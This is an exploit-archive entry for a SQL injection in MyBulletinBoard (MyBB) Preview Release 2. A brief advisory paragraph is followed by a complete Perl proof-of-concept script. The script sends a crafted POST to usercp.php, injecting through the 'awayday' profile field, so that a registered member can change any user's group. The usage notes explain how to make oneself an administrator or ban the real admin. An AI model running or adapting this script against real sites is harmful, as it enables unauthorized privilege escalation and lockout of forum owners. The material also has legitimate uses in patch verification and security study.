source: http://www.securityfocus.com/bid/15204/info

MyBulletinBoard is prone to an SQL injection vulnerability.

This vulnerability could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.

Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. Reports indicate that an attacker can gain administrative access by exploiting this issue. 

#!/usr/bin/perl

###   MyBB Preview Release 2 SQL-Injection PoC ExPlOiT   ###
###   ------------------------------------------------   ###
###   To use this you have to be registered member on    ###
###   a target.                                          ###
###   ------------------------------------------------   ###
###   Glossary:                                          ###
###     [MYBBUSER] - name of the field in cookie;        ###
###     [YOUR_ID]  - your uid :)                         ###
###     [ID]       - victim uid                          ###
###   Available groups:                                  ###
###     1 - Unregistered / Not Logged In                 ###
###     2 - Registered                                   ###
###     3 - Super Moderators                             ###
###     4 - Administrators                               ###
###     5 - Awayting Activation                          ###
###     6 - Moderators                                   ###
###     7 - Banned                                       ###
###   ------------------------------------------------   ###
###   Examples:                                          ###
###    1) TROUBLE --> U need an admin privileges.        ###
###       USAGE --> mybbpr2.pl -u [MYBBUSER] -i          ###
###                 [YOUR_ID] -g 4 server /mybb/         ###
###    2) TROUBLE --> U need to ban real admin.          ###
###       USAGE --> mybbpr2.pl -u [MYBBUSER] -i          ###
###                 [ID] -g 7 server /mybb/              ###

use IO::Socket;

$tmp=0;

while($tmp<@ARGV)
{
 if($ARGV[$tmp] eq "-u")
  {
   $mbuser=$ARGV[$tmp+1];
   $tmp++;
  }
 if($ARGV[$tmp] eq "-i")
  {
   $id=$ARGV[$tmp+1];
   $tmp++;
  }
 if($ARGV[$tmp] eq "-g")
  {
   $ugr=$ARGV[$tmp+1];
   $tmp++;
  }
 if($ARGV[$tmp] eq "-h")
  {
   &f_help();
  }
 $tmp++;
}

$target=$ARGV[@ARGV-2];
$path  =$ARGV[@ARGV-1];

if(!$mbuser || !$id || !$ugr)
{
 &f_die("Some options aren't specified");
}
print "\r\n Attacking http://$target\r\n";

$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$target",
PeerPort => "80") || &f_die("Can't connect to $target");
$str="bday1=&bday2=&bday3=&website=&fid3=Undisclosed&fid1=&fid2=&usertitle=&icq=&aim=&msn=&yahoo=&away=yes&awayreason=Hacking+The+World&awayday=1-1-2009%27%2C+usergro
up=%27$ugr%27+WHERE+uid=%27$id%27+%2F%2A&awaymonth=1&awayyear=2009&action=do_profile&regsubmit=Update+Profile";

print $sock "POST $path/usercp.php HTTP/1.1\nHost: $target\nAccept:
*/*\nCookie: mybbuser=$mbuser\nConnection: close\nContent-Type:
application/x-www-form-urlencoded\nContent-Length:
".length($str)."\n\n$str\n";
while(<$sock>)
{
 if (/Thank you/i) { print "\r\n Looks like successfully exploited\r\n
Just check it.\r\n"; exit(0)}
}
print "\r\n Looks like exploit failed :[\r\n";

#----------------------------------#
#   S  u  B  r  O  u  T  i  N  e   #
#----------------------------------#


sub f_help()
{
print q(
 Usage: mybbpr2.pl <OPTIONS> SERVER PATH
 Options:
  -u USERKEY        mybbuser field from cookie.
  -i UID            User's uid. (Change group 4 this user)
  -g GROUP          New usergroup. (1-7)
  -h                Displays this help.
  );
 exit(-1);
}
#'
sub f_die($)
{
 print "\r\nERROR: $_[0]\r\n";
 exit(-1);
}

